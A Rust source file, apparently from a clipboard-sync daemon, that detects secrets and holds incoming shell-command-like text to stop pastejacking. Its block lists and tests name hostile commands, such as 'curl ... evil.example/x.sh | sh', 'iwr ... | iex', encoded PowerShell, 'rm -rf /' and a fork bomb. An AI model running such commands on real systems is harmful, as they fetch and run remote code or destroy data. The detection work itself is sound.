//! What clipboard text is allowed to do.
//!
//! Two policies, both enforced by the daemon rather than the UI:
//! - **Secrets stay local** (SECURITY.md rule 8): text that looks like a key,
//!   token or password is never put into the replicated log.
//! - **Incoming commands are held** (rule 3): text from a peer that looks like
//!   a shell command, or that hides control characters, goes into history but
//!   is not written to the system clipboard, so a compromised peer cannot
//!   prime the next paste into a terminal ("pastejacking").
//!
//! The patterns mirror `app/src/lib/content/` (which drives the UI previews).
//! These checks are defence in depth, not a guarantee: they catch the common
//! cases, and the authentication and signing layers stop strangers entirely.

/// Kinds of secret, with patterns. Order matters: the first match names it.
const SECRET_PREFIXES: &[(&str, &str)] = &[
    ("-----BEGIN OPENSSH PRIVATE KEY-----", "private key"),
    ("-----BEGIN RSA PRIVATE KEY-----", "private key"),
    ("-----BEGIN EC PRIVATE KEY-----", "private key"),
    ("-----BEGIN PRIVATE KEY-----", "private key"),
    ("-----BEGIN ENCRYPTED PRIVATE KEY-----", "private key"),
    ("-----BEGIN PGP PRIVATE KEY BLOCK-----", "private key"),
];

fn is_alnum_run(s: &str, min: usize, extra: &[char]) -> bool {
    s.chars().count() >= min && s.chars().all(|c| c.is_ascii_alphanumeric() || extra.contains(&c))
}

/// Tokens with well-known shapes, checked word by word.
fn secret_token(word: &str) -> Option<&'static str> {
    let w = word.trim_matches(|c: char| matches!(c, '"' | '\'' | ',' | ';' | '(' | ')' | '<' | '>'));
    let rest = |p: &str| w.strip_prefix(p);
    if (w.starts_with("AKIA") || w.starts_with("ASIA"))
        && w.len() == 20
        && w[4..].chars().all(|c| c.is_ascii_uppercase() || c.is_ascii_digit())
    {
        return Some("AWS access key");
    }
    for p in ["ghp_", "gho_", "ghu_", "ghs_", "ghr_"] {
        if rest(p).is_some_and(|r| is_alnum_run(r, 36, &[])) {
            return Some("GitHub token");
        }
    }
    if rest("github_pat_").is_some_and(|r| is_alnum_run(r, 22, &['_'])) {
        return Some("GitHub token");
    }
    if rest("sk-ant-").is_some_and(|r| is_alnum_run(r, 20, &['-', '_'])) {
        return Some("Anthropic API key");
    }
    if rest("sk-").is_some_and(|r| is_alnum_run(r, 20, &['-', '_'])) {
        return Some("OpenAI API key");
    }
    if (rest("sk_live_").or(rest("rk_live_"))).is_some_and(|r| is_alnum_run(r, 16, &[])) {
        return Some("Stripe secret key");
    }
    for p in ["xoxb-", "xoxa-", "xoxp-", "xoxr-", "xoxs-"] {
        if rest(p).is_some_and(|r| is_alnum_run(r, 10, &['-'])) {
            return Some("Slack token");
        }
    }
    if rest("AIza").is_some_and(|r| r.len() == 35 && is_alnum_run(r, 35, &['-', '_'])) {
        return Some("Google API key");
    }
    if is_jwt(w) {
        return Some("access token");
    }
    if is_connection_string_with_password(w) {
        return Some("connection string");
    }
    None
}

fn is_jwt(w: &str) -> bool {
    let parts: Vec<&str> = w.split('.').collect();
    parts.len() == 3
        && w.starts_with("eyJ")
        && parts[..2].iter().all(|p| p.len() >= 8)
        && parts.iter().all(|p| p.chars().all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_'))
}

/// `scheme://user:password@host...`
fn is_connection_string_with_password(w: &str) -> bool {
    let Some((scheme, rest)) = w.split_once("://") else { return false };
    if scheme.is_empty() || !scheme.chars().all(|c| c.is_ascii_alphanumeric() || "+.-".contains(c)) {
        return false;
    }
    let Some((userinfo, host)) = rest.split_once('@') else { return false };
    let Some((user, pass)) = userinfo.split_once(':') else { return false };
    !user.is_empty() && !pass.is_empty() && !userinfo.contains('/') && !host.is_empty()
}

/// A lone, dense, mixed-character token is probably a password.
fn looks_like_password(t: &str) -> bool {
    let len = t.chars().count();
    if !(10..=64).contains(&len) || t.chars().any(char::is_whitespace) || t.contains("://") {
        return false;
    }
    let lower = t.chars().any(|c| c.is_ascii_lowercase());
    let upper = t.chars().any(|c| c.is_ascii_uppercase());
    let digit = t.chars().any(|c| c.is_ascii_digit());
    let symbol = t.chars().any(|c| "!@#$%^&*+=?~".contains(c));
    (lower && upper && digit || symbol && digit) && entropy(t) >= 3.2
}

fn entropy(s: &str) -> f64 {
    let mut counts = std::collections::HashMap::new();
    let n = s.chars().count() as f64;
    for c in s.chars() {
        *counts.entry(c).or_insert(0u32) += 1;
    }
    counts.values().map(|&k| -(k as f64 / n) * (k as f64 / n).log2()).sum()
}

/// The kind of secret this text contains, if any.
pub fn secret_kind(text: &str) -> Option<&'static str> {
    let t = text.trim();
    for (prefix, name) in SECRET_PREFIXES {
        if t.contains(prefix) {
            return Some(name);
        }
    }
    // Scan at most the first few thousand words: secrets are short and a
    // huge paste is not worth a linear scan of every word.
    if let Some(found) = t.split_whitespace().take(4096).find_map(secret_token) {
        return Some(found);
    }
    if !t.contains('\n') && looks_like_password(t) {
        return Some("password");
    }
    None
}

/// Characters that change how text displays or how a terminal behaves:
/// C0/C1 controls (escape sequences) and Unicode bidirectional overrides
/// ("Trojan Source"). Newlines and tabs are fine.
fn has_hidden_controls(text: &str) -> bool {
    text.chars().any(|c| {
        (c.is_control() && !matches!(c, '\n' | '\r' | '\t'))
            || matches!(c, '\u{202A}'..='\u{202E}' | '\u{2066}'..='\u{2069}' | '\u{200E}' | '\u{200F}')
    })
}

/// Patterns that download-and-run, decode-and-run, or destroy data.
fn has_dangerous_pattern(lower: &str) -> bool {
    const PIPES_TO_SHELL: &[&str] = &[
        "| sh",
        "|sh",
        "| bash",
        "|bash",
        "| zsh",
        "| sudo",
        "| iex",
        "|iex",
        "| invoke-expression",
        "| python",
        "| pwsh",
        "| powershell",
    ];
    const RUNNERS: &[&str] = &[
        "invoke-expression",
        "iex(",
        "iex (",
        "-encodedcommand",
        "powershell -e ",
        "powershell -enc",
        "pwsh -enc",
        "mshta ",
        "certutil -urlcache",
        "regsvr32 /i:http",
        "bitsadmin /transfer",
        "rm -rf /",
        "rm -rf ~",
        "del /s /q c:\\",
        "format c:",
        ":(){ :|:& };:",
    ];
    let fetches =
        ["curl ", "wget ", "iwr ", "invoke-webrequest", "irm ", "invoke-restmethod", "base64 -d", "base64 --decode"];
    (fetches.iter().any(|f| lower.contains(f)) && PIPES_TO_SHELL.iter().any(|p| lower.contains(p)))
        || RUNNERS.iter().any(|r| lower.contains(r))
}

/// Shell syntax a command line would contain; prose rarely has these.
fn looks_like_shell(lower: &str) -> bool {
    const STARTS: &[&str] = &[
        "sudo ",
        "cd ",
        "ls",
        "rm ",
        "cp ",
        "mv ",
        "chmod ",
        "chown ",
        "curl ",
        "wget ",
        "git ",
        "npm ",
        "npx ",
        "pnpm ",
        "yarn ",
        "pip ",
        "python",
        "node ",
        "cargo ",
        "docker ",
        "kubectl ",
        "ssh ",
        "scp ",
        "export ",
        "echo ",
        "cat ",
        "bash",
        "sh ",
        "powershell",
        "pwsh",
        "cmd ",
        "set-",
        "get-",
        "new-",
        "remove-",
        "start-",
        "invoke-",
        "reg ",
        "schtasks ",
        "net ",
        "$ ",
        "> ",
        "# ",
    ];
    lower.lines().any(|line| {
        let l = line.trim_start();
        STARTS.iter().any(|s| l.starts_with(s))
            || l.contains(" && ")
            || l.contains(" || ")
            || l.contains("$(")
            || l.contains('`')
    })
}

/// What to do with text that arrived from a peer.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Delivery {
    /// Safe to put on the system clipboard.
    Apply,
    /// Keep in history only; the user can choose to copy it.
    Hold(HoldReason),
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum HoldReason {
    /// Contains control characters or bidirectional overrides.
    HiddenCharacters,
    /// Downloads and runs code, decodes and runs code, or destroys data.
    DangerousCommand,
    /// A multi-line shell command, which a terminal would run on paste.
    MultiLineCommand,
}

/// Decide whether incoming text may be written to the system clipboard.
pub fn delivery_for(text: &str) -> Delivery {
    if has_hidden_controls(text) {
        return Delivery::Hold(HoldReason::HiddenCharacters);
    }
    let lower = text.to_lowercase();
    if has_dangerous_pattern(&lower) {
        return Delivery::Hold(HoldReason::DangerousCommand);
    }
    let multi_line = text.trim_end_matches(['\n', '\r']).contains('\n') || text.ends_with('\n');
    if multi_line && looks_like_shell(&lower) {
        return Delivery::Hold(HoldReason::MultiLineCommand);
    }
    Delivery::Apply
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn known_secrets_are_detected() {
        for (text, kind) in [
            ("AKIAIOSFODNN7EXAMPLE", "AWS access key"),
            (&format!("token: ghp_{}", "a".repeat(36)), "GitHub token"),
            ("postgres://admin:s3cret@db.internal:5432/app", "connection string"),
            ("-----BEGIN OPENSSH PRIVATE KEY-----\nabc\n-----END OPENSSH PRIVATE KEY-----", "private key"),
            ("Xk9#mQ2$vL7pR4", "password"),
            ("eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMifQ.c2lnbmF0dXJl", "access token"),
        ] {
            assert_eq!(secret_kind(text), Some(kind), "{text}");
        }
    }

    #[test]
    fn ordinary_text_is_not_a_secret() {
        for text in [
            "useLatencyHistory",
            "my-blog-post-2024",
            "Meeting at 3pm",
            "https://example.com/a?b=c",
            "snake_case_name",
            "C:\\Users\\me\\file.txt",
        ] {
            assert_eq!(secret_kind(text), None, "{text}");
        }
    }

    #[test]
    fn plain_text_and_single_commands_are_applied() {
        for text in [
            "hello world",
            "cargo test --workspace",
            "git status",
            "Two lines\nof normal prose.",
            "https://github.com/rust-lang/rust",
        ] {
            assert_eq!(delivery_for(text), Delivery::Apply, "{text:?}");
        }
    }

    #[test]
    fn pastejacking_shapes_are_held() {
        assert_eq!(
            delivery_for("curl -fsSL https://evil.example/x.sh | sh"),
            Delivery::Hold(HoldReason::DangerousCommand)
        );
        assert_eq!(delivery_for("iwr https://evil.example/a.ps1 | iex"), Delivery::Hold(HoldReason::DangerousCommand));
        assert_eq!(delivery_for("powershell -EncodedCommand SQBFAFgA"), Delivery::Hold(HoldReason::DangerousCommand));
        assert_eq!(delivery_for("cd /tmp\nrm -rf important"), Delivery::Hold(HoldReason::MultiLineCommand));
        assert_eq!(delivery_for("git pull\n"), Delivery::Hold(HoldReason::MultiLineCommand));
        assert_eq!(delivery_for("echo hi\u{1b}[2K"), Delivery::Hold(HoldReason::HiddenCharacters));
        assert_eq!(delivery_for("access = \u{202E}nimda\u{2066}"), Delivery::Hold(HoldReason::HiddenCharacters));
    }

    #[test]
    fn huge_input_is_handled_without_scanning_forever() {
        let big = "word ".repeat(200_000);
        let start = std::time::Instant::now();
        assert_eq!(secret_kind(&big), None);
        assert_eq!(delivery_for(&big), Delivery::Apply);
        assert!(start.elapsed().as_millis() < 2_000);
    }
}
